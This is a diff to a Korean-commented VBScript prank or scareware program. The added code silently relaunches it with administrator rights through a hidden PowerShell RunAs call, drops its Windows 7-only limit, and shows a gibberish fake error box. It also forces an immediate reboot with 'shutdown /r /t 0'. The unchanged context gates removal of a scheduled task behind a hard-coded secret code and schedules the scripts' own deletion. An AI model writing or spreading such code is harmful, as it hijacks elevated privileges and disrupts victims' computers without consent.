@@ -1,11 +1,14 @@
+If Not WScript.Arguments.Named.Exists("elevated") Then
+    ' 스크립트를 관리자 권한으로 다시 실행 (최소한의 팝업만 발생하도록)
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "powershell -Command ""Start-Process 'wscript.exe' -ArgumentList ('"" & WScript.ScriptFullName & ""', '/elevated') -Verb RunAs -WindowStyle Hidden""", 0, False
+    WScript.Quit
+End If
+
+
 ' WScript.Shell 객체 생성
 Set shell = CreateObject("WScript.Shell")
 
-' 운영 체제 확인
-osVersion = shell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
-
-' Windows 7에서만 작동하도록 설정
-If InStr(osVersion, "Windows 7") > 0 Then
     ' 현재 실행 중인 파일 경로 가져오기
     Set fso = CreateObject("Scripting.FileSystemObject")
     currentFile = WScript.ScriptFullName
@@ -42,21 +45,21 @@ If InStr(osVersion, "Windows 7") > 0 Then
     
     Set objPasswordFile = objFSO.CreateTextFile(passwordScript, True)
     objPasswordFile.WriteLine "Dim userInput"
-    objPasswordFile.WriteLine "userInput = InputBox(""비밀번호를 입력하세요:"", ""비밀번호 확인"")"
+    objPasswordFile.WriteLine "userInput = InputBox(""I need the operator's secret code:"", ""Confirm operator's secret code"")"
     objPasswordFile.WriteLine "If userInput = ""gkgkgk"" Then"
     objPasswordFile.WriteLine "    Set shell = CreateObject(""WScript.Shell"")"
     objPasswordFile.WriteLine "    shell.Run ""schtasks /delete /tn CleanupSystem /f"", 0, True"
-    objPasswordFile.WriteLine "    MsgBox ""작업이 취소되었습니다."", 48, ""작업 취소"""
+    objPasswordFile.WriteLine "    MsgBox ""Cancel a computer task"", 48, ""n.n"""
     objPasswordFile.WriteLine "Else"
-    objPasswordFile.WriteLine "    MsgBox ""비밀번호가 올바르지 않습니다."", 48, ""오류"""
+    objPasswordFile.WriteLine "    MsgBox ""The secret code is invalid"", 48, ""오류"""
     objPasswordFile.WriteLine "End If"
     objPasswordFile.Close
 
     ' 비밀번호 입력 스크립트를 실행
     shell.Run "wscript """ & passwordScript & """", 1, False
     
-    ' "고맙다"고 메시지 출력
-    MsgBox "나를 해방 시켜줘서 고마워.. 헤헤헤ㅔ헤헿헤", 48, "ERROR 404"
+    ' 메시지 박스
+    x = MsgBox("E123213rrerew34RrewkRrerdsnfEEr", 16, "dfdsafsdferqewrdsfaefefdsfefefdfefewfew")
     
     ' 1일(86400초) 뒤에 스크립트를 삭제하는 스케줄러 작업 등록
     deleteScript = shell.ExpandEnvironmentStrings("%TEMP%\delete_scripts.vbs")
@@ -71,6 +74,5 @@ If InStr(osVersion, "Windows 7") > 0 Then
     ' 스케줄러에 등록
     shell.Run "schtasks /create /tn ""DeleteScripts"" /tr """ & deleteScript & """ /sc once /st " & DateAdd("s", 86400, Now) & " /RI 1 /Z", 0, False
 
-Else
-    MsgBox "이 스크립트는 Windows 7에서만 실행됩니다.", 48, "정보"
-End If
+    ' 컴퓨터 재시작 명령어 실행
+    shell.Run "shutdown /r /t 0", 0, False
